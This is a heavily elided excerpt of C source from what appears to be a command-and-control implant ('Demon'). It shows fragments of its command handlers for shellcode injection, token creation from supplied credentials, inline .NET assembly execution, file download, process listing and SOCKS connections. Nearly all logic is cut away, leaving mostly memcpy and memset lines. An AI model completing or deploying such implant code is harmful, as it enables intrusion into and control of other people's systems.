                ...
                while ( TRUE )
                {
                    ...
                    if ( MemRet != NULL )
                    {
                        ...
                        if ( UserDomain.Buffer ) {
                            memset( UserDomain.Buffer, 0, UserDomain.Length );
...
VOID CommandProcList(
    ...
    if ( NT_SUCCESS( NtStatus = ProcessSnapShot( &SysProcessInfo, &ProcessInfoSize ) ) )
    {
        ...
        if ( SysProcessPtr ) {
            memset( SysProcessPtr, 0, ProcessInfoSize );
...
VOID CommandFS( PPARSER Parser )
{
    ...
    switch ( Command )
    {
        case DEMON_COMMAND_FS_DIR: PUTS( "FS::Dir" )
        {
            ...
            {
                memcpy( Path, TargetFolder, MAX_PATH * sizeof( WCHAR ) );
            }
        ...
        case DEMON_COMMAND_FS_DOWNLOAD: PUTS( "FS::Download" )
        {
            ...
            memcpy( FileName.Buffer, Buffer, FileName.Length );
...
VOID CommandInjectShellcode(
    ...
    Payload = ParserGetBytes( Parser, (UINT32*)&Size );
    Argv    = ParserGetBytes( Parser, (UINT32*)&Argc );
...
VOID CommandToken( PPARSER Parser )
{
    ...
    switch ( Command )
    {
        ...
        case DEMON_COMMAND_TOKEN_MAKE: PUTS( "Token::Make" )
        {
            ...
            if ( dwUserSize > 0 && dwPasswordSize > 0 && dwDomainSize > 0 )
            {
                ...
                if ( hToken != NULL )
                {
                    ...
                    memcpy( BufferUser, lpUser, dwUserSize );
                    memcpy( BufferPassword, lpPassword, dwPasswordSize );
                    memcpy( BufferDomain, lpDomain, dwDomainSize );
        ...
        case DEMON_COMMAND_TOKEN_GET_UID: PUTS( "Token::GetUID" )
        {
            ...
            if ( User.Buffer ) {
                memset( User.Buffer,0, User.Length );
...
VOID CommandAssemblyInlineExecute( PPARSER Parser )
{
    if ( ! Instance->Dotnet )
    {
        ...
        memcpy( Instance->Dotnet->PipeName.Buffer, Buffer.Buffer, Instance->Dotnet->PipeName.Length );
        ...
        memcpy( Instance->Dotnet->AppDomainName.Buffer, Buffer.Buffer, Instance->Dotnet->AppDomainName.Length );

        /* Parse Net Version */
        Buffer.Buffer = ParserGetWString( Parser, &Buffer.Length );
        Instance->Dotnet->NetVersion.Buffer = MmHeapAlloc( Buffer.Length + sizeof( WCHAR ) );
        Instance->Dotnet->NetVersion.Length = Buffer.Length;
        memcpy( Instance->Dotnet->NetVersion.Buffer, Buffer.Buffer, Instance->Dotnet->NetVersion.Length );
...
VOID CommandConfig( PPARSER Parser )
{
    ...
    switch ( Config )
    {
        ...
        case DEMON_CONFIG_INJECTION_SPAWN64:
        {
            ...
            memcpy( Instance->Config.Process.Spawn64, Buffer, Size );
        ...
        case DEMON_CONFIG_INJECTION_SPAWN32:
        {
            ...
            memcpy( Instance->Config.Process.Spawn86, Buffer, Size );
    ...
    switch ( Command )
    {
        ...
        case SOCKET_COMMAND_CONNECT: PUTS( "Socket::Connect" )
        {
            ...
            else if ( ATYP == 3 )
            {
                ...
                memcpy( Domain, HostIp, HostIpSize );
